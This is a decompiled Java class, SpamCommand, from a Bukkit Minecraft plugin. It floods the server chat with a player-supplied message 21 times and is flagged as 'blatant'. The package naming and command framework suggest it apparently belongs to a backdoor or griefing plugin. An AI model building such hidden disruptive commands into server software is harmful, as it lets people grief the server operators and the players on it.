/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class SpamCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        StringBuilder bc2 = new StringBuilder();
        for (int i2 = 1; i2 != args.length; ++i2) {
            bc2.append(args[i2]).append(" ");
        }
        for (int x2 = 0; x2 <= 20; ++x2) {
            Bukkit.broadcastMessage(ChatColor.translateAlternateColorCodes('&', bc2.toString()));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

